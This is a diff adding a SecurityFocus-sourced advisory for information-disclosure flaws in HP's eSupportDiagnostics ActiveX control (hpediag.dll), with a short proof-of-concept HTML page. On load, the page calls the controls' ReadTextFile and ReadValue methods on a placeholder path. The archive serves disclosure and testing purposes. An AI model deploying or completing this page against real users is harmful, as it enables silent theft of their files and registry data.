@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/26967/info
+
+The HP eSupportDiagnostics ActiveX control is prone to multiple information-disclosure vulnerabilities.
+
+An attacker can exploit these issues by enticing an unsuspecting victim to visit a malicious HTML page.
+
+Successfully exploiting these issues allows remote attackers to obtain the contents of arbitrary files and registry values. Information harvested may aid in further attacks.
+
+These issues affect 'hpediag.dll' 1.0.11.0; other versions may also be affected. 
+
+<html>
+<head>
+ <script language="JavaScript" DEFER>
+  function Check() {
+   var out = fileUtil.ReadTextFile(somePath);
+   var out = regUtil.ReadValue(somePath);
+
+  }
+ </script>
+
+</head>
+<body onload="JavaScript: return Check();">
+ <object id="fileUtil" classid="clsid:CDAF9CEC-F3EC-4B22-ABA3-9726713560F8" />
+ <object id="regUtil"  classid="clsid:0C378864-D5C4-4D9C-854C-432E3BEC9CCB" />
+</body>
+</html>
